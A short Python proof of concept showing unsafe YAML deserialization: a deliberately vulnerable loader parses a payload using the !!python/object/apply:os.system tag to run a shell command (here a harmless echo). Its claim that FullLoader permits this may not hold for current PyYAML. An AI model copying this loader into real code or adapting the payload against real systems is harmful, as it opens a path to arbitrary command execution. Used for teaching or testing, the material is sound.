import yaml

# Vulnerable loader that allows execution of arbitrary Python commands
def vulnerable_load_yaml(vault_content):
    return yaml.load(vault_content, Loader=yaml.FullLoader)

# Example usage
vault_content = """
my_secret: !!python/object/apply:os.system ['echo vulnerable']
"""

# Load the vault content unsafely
data = vulnerable_load_yaml(vault_content)
print(data)